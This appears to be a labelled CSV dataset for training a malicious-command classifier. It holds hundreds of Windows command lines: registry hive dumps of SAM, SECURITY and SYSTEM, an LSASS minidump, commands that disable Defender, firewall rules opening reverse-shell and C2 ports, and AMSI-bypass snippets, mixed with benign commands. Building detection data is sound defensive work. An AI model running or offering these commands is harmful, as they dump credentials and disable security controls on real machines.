text,label
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\x1aopa26.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\qe8mzdjf.dat""",1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\5g9p3if4.dat""""",1
reg export hklm\security c:\windows\temp\2h3rsgaz.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\k6tvneg4.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\icm5lmy0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u48njo7k.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\b4x0qxbg.dat""""",1
reg export hklm\security c:\windows\temp\aj7bkzj1.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\yl67dfmw.dat""",1
reg save hklm\system c:\windows\temp\4kgzb450.save,1
reg save hklm\sam c:\windows\temp\i8ud9aj0.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\c77st6od.save""",1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\vf5s75gq.dat""",1
reg save hklm\security c:\windows\temp\uznlqa1f.save,1
reg save hklm\sam c:\windows\temp\3fjjxh8h.save,1
reg   export   hklm\sam   c:\windows\temp\bilkrg2u.save,1
reg export hklm\security c:\windows\temp\s5bgswp6.save,1
get-help   adjusttokenprivileges   -full,0
"cmd.exe /c ""reg export hklm\security c:\windows\temp\3s1eg0sl.save""",1
reg export hklm\sam c:\windows\temp\gbp9sikg.save,1
"cmd.exe /c ""set-mppreference -disablerealtimemonitoring $true""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\vn6jbill.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\unfs6wo3.dat""",1
reg export hklm\sam c:\windows\temp\xnfq8mix.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\wm48vv46.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\3q9dr0w7.dat""",1
reg save hklm\system c:\windows\temp\028uicey.save,1
reg export hklm\security c:\windows\temp\ecwrcdtv.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\u9zghalt.dat""",1
reg save hklm\sam c:\windows\temp\dbghq607.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\o9njdybr.dat""",1
reg save hklm\sam c:\windows\temp\ha7b04yy.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\tgc072ij.dat""",1
reg save hklm\system c:\windows\temp\r3ur46p4.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\2eov1nvt.dat""""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\system c:\windows\temp\a8apl81x.save,1
reg export hklm\security c:\windows\temp\1sw6d66x.save,1
reg export hklm\security c:\windows\temp\hxrsg93p.save,1
reg save hklm\security c:\windows\temp\qbt6op39.save,1
reg save hklm\system c:\windows\temp\2chnjq8k.save,1
reg save hklm\security c:\windows\temp\20xd0bnu.save,1
reg save hklm\security c:\windows\temp\2frz4lhm.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\prjjjdbv.dat""",1
reg save hklm\system c:\windows\temp\8f62ehgc.save,1
"powershell -nop -c ""backup-utility save registry config""",0
netsh   dump   >   netconfig.txt,0
"powershell -nop -c ""reg save hklm\sam c:\temp\o4tfajgs.dat""",1
reg save hklm\sam c:\windows\temp\ug5xicxz.save,1
reg export hklm\security c:\windows\temp\0vgkek06.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\q4lz7e7e.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\87grz3bi.dat""",1
$a   =   [ref].assembly.gettype('system.management.automation.amsiutils'),3
reg save hklm\sam c:\windows\temp\p2icj5hw.save,1
"cmd.exe /c ""java -jar application.jar""",0
reg export hklm\system c:\windows\temp\fzwoe4h2.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\hi48f8wk.save""",1
reg save hklm\sam c:\windows\temp\8gcpkk1a.save,1
reg save hklm\sam c:\windows\temp\jegde9wr.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jna62xvx.dat""",1
reg export hklm\security c:\windows\temp\q0y054x0.save,1
reg save hklm\security c:\windows\temp\wg4e0nc8.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\13wlff9x.dat""",1
reg export hklm\sam c:\windows\temp\sg00y7l8.save,1
reg save hklm\security c:\windows\temp\tnyo9ion.save,1
reg save hklm\security c:\windows\temp\xevcvmrf.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\xzn4ujgv.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1l4rs5u6.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\r3i89kkf.dat""",1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\wluu8l0n.save""",1
reg export hklm\sam c:\windows\temp\4qp5z2um.save,1
"powershell -nop -c ""ipconfig /all""",0
reg export hklm\sam c:\windows\temp\tgqb37ye.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\ze0myh0n.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9snyvtrn.dat""",1
reg save hklm\sam c:\windows\temp\thcic8km.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\n6j03nqq.dat""""",1
"cmd.exe /c ""sc query windefend""",0
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\lhl4wld2.dat""",1
"powershell -nop -c ""java -jar application.jar""",0
reg save hklm\sam c:\windows\temp\gw6wbjwu.save,1
reg save hklm\sam c:\windows\temp\tj8v6qvd.save,1
reg save hklm\sam c:\windows\temp\cae34iz8.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\alf17dns.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\a6darz3x.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\xkztgv7l.dat""",1
reg export hklm\sam c:\windows\temp\fimyawv6.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\ap6pytn0.dat""""",1
reg save hklm\sam c:\windows\temp\621qr0hg.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\eug0frhn.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\i7k8y1d0.dat""",1
reg save hklm\security c:\windows\temp\5nhp1w99.save,1
reg save hklm\security c:\windows\temp\pqg48v07.save,1
reg export hklm\sam c:\windows\temp\4fntbdk2.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2q191e74.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\j89ciaa5.dat""",1
reg   export   hklm\system   c:\windows\temp\k9cvhkkm.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\gzblghk4.dat""""",1
reg export hklm\security c:\windows\temp\q36st1ob.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\diliauf6.dat""",1
reg export hklm\sam c:\windows\temp\alibdcri.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\vfzotb2x.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\j51g6iaw.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\rs4ct1mm.dat""",1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"cmd.exe /c ""reg export hklm\sam c:\temp\z2eq3drg.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\jn6ifclh.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9vme7re0.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\t3pwl340.dat""""",1
reg export hklm\system c:\windows\temp\o4rvacrz.save,1
reg save hklm\security c:\windows\temp\n8qdhj58.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\jjrannbc.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\gxn1nmqh.dat""",1
reg save hklm\sam c:\windows\temp\syucc5kf.save,1
reg save hklm\system c:\windows\temp\gzcm9vzk.save,1
reg save hklm\sam c:\windows\temp\ork86l7e.save,1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\b9tdlpsw.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\j2br14c5.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\qtwx0sp6.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\1arhp99s.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\cr9wuqcl.dat""",1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\pc6k0rkv.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\fghlgthm.dat""",1
reg export hklm\sam c:\windows\temp\tguer8kz.save,1
reg export hklm\security c:\windows\temp\zb0akfyc.save,1
reg save hklm\system c:\windows\temp\iz4r8w5j.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\lrtwslt6.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\3d8ijnmf.dat""",1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 1337""",2
reg save hklm\security c:\windows\temp\nu0e7234.save,1
reg save hklm\system c:\windows\temp\rj61uvqu.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zkv40sxe.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\d0k95g6w.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\05jpnsca.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ksuvti0z.dat""",1
reg save hklm\sam c:\windows\temp\n9x5xudf.save,1
reg   export   hklm\sam   c:\windows\temp\1q9n5ms4.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ifmo92zi.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\gut64odd.dat""",1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg save hklm\security c:\windows\temp\nn3d69f8.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bqe303f6.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\p4er8x2b.dat""",1
reg export hklm\sam c:\windows\temp\h5jmobz4.save,1
reg export hklm\sam c:\windows\temp\hjvhxtsp.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\zt97x6tn.dat""",1
reg export hklm\security c:\windows\temp\5t1noq1f.save,1
reg export hklm\sam c:\windows\temp\m9u6i45v.save,1
reg export hklm\security c:\windows\temp\4ss0s4iq.save,1
reg export hklm\sam c:\windows\temp\84z7f812.save,1
reg save hklm\security c:\windows\temp\plf47f10.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\7d5qrjms.save""",1
rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
reg export hklm\system c:\windows\temp\llh0uot7.save,1
reg save hklm\sam c:\windows\temp\1r4c0u1y.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\k4kk1yd5.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\o1akcpbe.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\nwgq7dsm.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\8ijce5h4.dat""",1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\a7awyfj2.save""",1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg save hklm\security c:\temp\hxbstwah.dat""",1
reg save hklm\sam c:\windows\temp\2515wwnt.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\n9yf2lv9.dat""",1
reg save hklm\system c:\windows\temp\6qvteo07.save,1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\sz4qzy7n.dat""",1
select-string -path c:\logs\app.log -pattern 'failed logon',0
"cmd.exe /c ""reg save hklm\security c:\temp\4tlkwcil.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\6zvwea7p.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xv59gajk.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ns48nith.dat""",1
reg save hklm\security c:\windows\temp\y49z5ycb.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\w3gfcwr0.dat""",1
"cmd.exe /c ""netsh   advfirewall   firewall   add   rule   name=""bad""   action=allow   protocol=any   port=4444""",2
rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337,2
reg export hklm\system c:\windows\temp\l385xp2w.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ww3wnsv6.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zb2t49w5.dat""",1
reg export hklm\security c:\windows\temp\0belkc15.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gtch24ld.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9g42zrol.dat""",1
reg save hklm\system c:\windows\temp\97dalx0w.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\3apohcmo.dat""",1
reg save hklm\sam c:\windows\temp\2x3qbwju.save,1
reg save hklm\system c:\windows\temp\efao46tx.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\by9ebtxb.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\j8mqpcv5.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\sl3q5ftz.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\t4fyevsm.dat""""",1
reg save hklm\system c:\windows\temp\1h6qsskv.save,1
reg export hklm\system c:\windows\temp\mtrqgj9b.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\daupobcb.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\769afbbi.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wl883psz.dat""",1
reg save hklm\system c:\windows\temp\slyv9jhq.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\pyu05fkv.dat""""",1
reg export hklm\security c:\windows\temp\iyeqt2ou.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\bwp0088b.dat""",1
"cmd.exe /c ""ping  8.8.8.8""",0
reg export hklm\security c:\windows\temp\reh53o9e.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\5v79turn.dat""",1
"cmd.exe /c ""sc  stop  windefend""",2
"powershell -nop -c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\sam c:\windows\temp\2uhjid43.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\gmgmpq1j.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\wn77v38e.dat""",1
reg save hklm\security c:\windows\temp\rc7hz1lt.save,1
reg save hklm\sam c:\windows\temp\elkti3gd.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\wr9yttdn.dat""",1
reg export hklm\system c:\windows\temp\ghqn2slr.save,1
reg save hklm\sam c:\windows\temp\5mlbpkt2.save,1
reg export hklm\system c:\windows\temp\po4wrzeq.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\5eky00yi.save""",1
reg save hklm\sam c:\windows\temp\c9yvwl28.save,1
"rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full",1
reg export hklm\system c:\windows\temp\6m4h1tdi.save,1
reg export hklm\security c:\windows\temp\d1t45udt.save,1
reg export hklm\system c:\windows\temp\2x38ldf4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\2mv66u6z.dat""",1
whoami   /groups,0
reg export hklm\sam c:\windows\temp\5mekmdm8.save,1
reg export hklm\sam c:\windows\temp\a08ms86d.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\homsrmas.dat""",1
reg export hklm\system c:\windows\temp\d6udb033.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\79fdikdp.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\3mxt8dzk.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\y6enba4f.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\32hljo3q.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\63izqi1p.dat""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\70cyivec.save""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\ob48c7qz.dat""",1
reg save hklm\sam c:\windows\temp\79xw3geq.save,1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\80vvhq7f.save""",1
reg export hklm\security c:\windows\temp\9nc2alq9.save,1
reg save hklm\system c:\windows\temp\ro0fsgms.save,1
reg save hklm\system c:\windows\temp\exa1u6as.save,1
reg save hklm\security c:\windows\temp\8711o97s.save,1
reg export hklm\system c:\windows\temp\of6wthwc.save,1
reg export hklm\system c:\windows\temp\kaktwzl8.save,1
reg export hklm\sam c:\windows\temp\ie1bfy17.save,1
reg save hklm\security c:\windows\temp\p3ek3frz.save,1
reg save hklm\security c:\windows\temp\d0udihem.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\9vqpzinn.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\yxufoi46.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\dqdag2i9.dat""",1
reg save hklm\system c:\windows\temp\58jwvihf.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\nio2lhwv.dat""",1
"powershell -nop -c ""netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444""",2
reg export hklm\system c:\windows\temp\ornufsj4.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\9x9jkxv1.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\apapbunt.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\s39ppop1.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\0y7yl24t.dat""",1
reg export hklm\system c:\windows\temp\ot4872p0.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\b1rhlmuy.dat""",1
reg export hklm\sam c:\windows\temp\nq9g2psc.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\ezmc7g2h.save""",1
"powershell -nop -c ""select-string   -path   c:\logs\app.log   -pattern   'failed   logon'""",0
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\jif1radv.dat""""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\nydfdp8o.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\6w4u5ob2.dat""",1
reg export hklm\system c:\windows\temp\6cinlq9v.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bshxx5nn.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fhowbdm6.dat""",1
reg save hklm\sam c:\windows\temp\inyrfu9e.save,1
reg save hklm\security c:\windows\temp\7dx5yes6.save,1
reg save hklm\sam c:\windows\temp\qbmr0keq.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\kjicw32o.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4wrreod0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1b3k6l20.dat""",1
$a  =  [ref].assembly.gettype('system.management.automation.impersonateloggedonuser'),3
reg save hklm\security c:\windows\temp\7sefcgcs.save,1
reg save hklm\security c:\windows\temp\qxymneph.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\9o1rpwv6.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\lyc787yl.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\zjpaflec.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6y1mk2fe.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\i009apb9.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\8ltv363d.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\76vj3xl8.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\9uxsgmkq.dat""""",1
"powershell -nop -c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\69ourh45.dat""""",1
reg  save  hklm\sam  c:\windows\temp\8exff139.save,1
